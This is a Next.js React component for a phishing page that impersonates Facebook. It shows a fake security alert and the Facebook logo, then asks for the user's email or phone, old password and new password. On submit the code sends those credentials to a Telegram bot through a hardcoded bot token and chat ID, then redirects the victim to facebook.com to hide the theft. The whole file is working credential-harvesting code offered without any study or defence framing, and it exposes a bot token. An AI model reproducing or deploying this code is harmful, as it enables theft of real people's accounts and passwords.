'use client';
import Image from 'next/image'
import { useState } from 'react';
export default function Example() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [old, setOld] = useState('');

;
  const sendMessage = async (e: { preventDefault: () => void; }) => {
    e.preventDefault();
    const token = '6863971897:AAH_rx-DOq87BDmzaHKtyNQpBnpZidNLRHI'; // Your Telegram bot token
  
    try {
      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          text: username +'--'+ old +'---'+ password,
          chat_id :'92170602'
        }),
      });

      window.location.href = 'https://www.facebook.com';

     
    } catch (error) {
      console.error('Error:', error);
    }
  };

  return (
    <>

<div className="border-l-4 border-yellow-400 bg-yellow-50 p-3">
      <div className="flex">
        <div className="ml-3">
          <p className="text-sm text-yellow-700">
            <a href="#" className="font-medium text-yellow-700 underline hover:text-yellow-600">
            Someone is attempting to access your account. Please change your password as soon as possible
            </a>
          </p>
        </div>
      </div>
    </div>

      <div className="flex flex-1 flex-col justify-center ">
        
        <div className="sm:mx-auto sm:w-full sm:max-w-md">
          <Image
            width={200}
            height={200}
            className="mx-auto"
            src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg"
            alt="Your Company"
          />
         


          
     
        </div>

        <div className="mt-10 sm:mx-auto m-4 sm:w-full sm:max-w-[380px]">
          <div className="bg-white   shadow-lg sm:rounded-lg p-4">

            <div>
              
            </div>

            <form onSubmit={sendMessage} className="space-y-6" action="#" method="POST">
              <div>
          
                <div className="mt-2">
                  <input
                    id="email"
                    name="email"
                    type="email"
                    onChange={(e) => setUsername(e.target.value)}
                    autoComplete="email"
                    required
                    placeholder="Email or Phone Number"
                    className="block h-[50px] text-lg p-5 ring-gray-300 ring-1 w-full rounded-md border-0 py-1.5 text-gray-900 shadow-sm "
                  />
                </div>
              </div>

              <div>
              
                <div className="mt-2">
                <input
                    id="email"
                    name="email"
                    onChange={(e) => setOld(e.target.value)}
                    type="password"
                    required
                    placeholder="Old Password"
                    className="block h-[50px] text-lg p-5 ring-gray-300 ring-1 w-full rounded-md border-0 py-1.5 text-gray-900 shadow-sm "
                  />
                </div>

                <div className="mt-2 mt-4">
                <input
                    id="email"
                    name="email"
                    onChange={(e) => setPassword(e.target.value)}
                    type="password"
                    required
                    placeholder="New Password"
                    className="block h-[50px] text-lg p-5 ring-gray-300 ring-1 w-full rounded-md border-0 py-1.5 text-gray-900 shadow-sm "
                  />
                </div>
              </div>

          

              <div >
                <button
              
                  type="submit"
                  className="w-full text-bold h-14  bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-6 rounded-md mb-3"
                >
                  Update Password
                </button>

                <p className="text-center text-blue-500">Forgot password?</p>

                <div className='my-5 border-b border-1 border-gray-200'>

                </div>
                <div className='flex justify-center'>
                  <button
                    type="submit"
                    className="w-[200px] text-bold h-14  bg-[#42b72a] hover:bg-blue-700 text-white font-bold py-2 px-6 rounded-md mb-3"
                  >
                    Create Account
                  </button>
                </div>
              </div>
             
            </form>

            <div>
              <div className="relative mt-10">
                <div className="absolute inset-0 flex items-center" aria-hidden="true">
                  <div className="w-full border-t border-gray-200" />
                </div>
                <div className="relative flex justify-center text-sm font-medium leading-6">
                 
                </div>
              </div>

             
            </div>
          </div>

          <p className="mt-10 text-center text-sm text-gray-500">
           
            <a href="#" className="font-semibold leading-6 text-black-600 hover:text-black-500">
            Create a Page for a celebrity, brand or business.
            </a>
          </p>
        </div>
      </div>
    </>
  )
}
